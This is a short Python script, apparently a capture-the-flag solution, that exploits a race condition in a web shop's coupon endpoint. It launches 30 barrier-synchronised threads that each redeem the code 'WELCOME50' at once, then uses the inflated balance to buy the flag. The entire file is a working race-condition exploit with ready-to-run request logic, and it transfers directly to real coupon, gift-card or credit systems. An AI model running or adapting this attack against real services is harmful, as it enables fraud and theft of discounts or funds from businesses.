import requests
import threading

PORT = 55715  
URL_BASE = f"http://10.21.232.223:{PORT}"
URL_REDEEM = f"{URL_BASE}/api/redeem"
URL_BUY = f"{URL_BASE}/api/buy_ramen"

THREAD_COUNT = 30
# The barrier acts as a digital starting line so all 30 threads fire at the exact same millisecond
sync_barrier = threading.Barrier(THREAD_COUNT)

# Create a master session template to capture the core cookies correctly
init_session = requests.Session()
init_session.get(URL_BASE)
saved_cookies = init_session.cookies.get_dict()

def race_strike():
    # Each thread gets its own completely isolated connection pipeline
    thread_session = requests.Session()
    
    # Inject the session cookies so the server registers our user profile
    requests.utils.add_dict_to_cookiejar(thread_session.cookies, saved_cookies)
    
    # Hold the thread here until all 30 threads arrive at the gate
    sync_barrier.wait()
    
    try:
        # Launch the exploit request simultaneously
        response = thread_session.post(URL_REDEEM, json={"code": "WELCOME50"}, timeout=3)
        print(f"[Result] {response.text}")
    except Exception as e:
        print(f"[-] Request failed to land: {e}")

# 3. Queue the threads into execution blocks
threads = []
for i in range(THREAD_COUNT):
    t = threading.Thread(target=race_strike)
    threads.append(t)

for t in threads:
    t.start()

# Wait for the simultaneous blast to clear the pipeline
for t in threads:
    t.join()

# Connect using our credentials and buy the flag
final_check = requests.Session()
requests.utils.add_dict_to_cookiejar(final_check.cookies, saved_cookies)
flag_response = final_check.post(URL_BUY)
print(f"\n[+] Server Response: {flag_response.text}")
